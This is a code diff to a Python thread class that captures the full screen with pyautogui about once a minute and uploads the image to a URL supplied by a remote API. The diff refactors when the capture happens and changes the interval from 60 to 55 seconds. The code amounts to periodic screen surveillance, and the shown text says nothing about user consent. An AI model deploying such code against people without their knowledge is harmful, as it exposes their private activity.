@@ -19,17 +19,17 @@ class Screenshot(threading.Thread):
             try:
                 response = requests.get("https://" + self.api + "/screenshot",
                                          headers={"x-api-key": self.key})
-                # Take screenshot
-                pic = pyautogui.screenshot()
-                # Save the image
-                file_name = 'Screenshot.jpg'
-                pic.save(file_name)
-                files = {'file': (file_name, open(file_name, 'rb'), 'image/jpg', {'Expires': '0'})}
-
                 if response.ok:
-                    upload = response.json()
-                    upload_screenshot = requests.post(upload['url'], data=upload['fields'], files=files)
-                    print('screen shot uploaded!')
+                    # Take screenshot
+                    pic = pyautogui.screenshot()
+                    # Save the image
+                    file_name = 'Screenshot.jpg'
+                    pic.save(file_name)
+                    with open(file_name, "rb") as image_file:
+                        files = {'file': (file_name, image_file, 'image/jpg', {'Expires': '0'})}
+                        upload = response.json()
+                        upload_screenshot = requests.post(upload['url'], data=upload['fields'], files=files)
+                        print('screen shot uploaded!')
                     os.remove(file_name)
                 else:
                     print(response.status_code)
@@ -37,4 +37,4 @@ class Screenshot(threading.Thread):
 
             except Exception as e:
                 print(e)
-            sleep(60)
+            sleep(55)
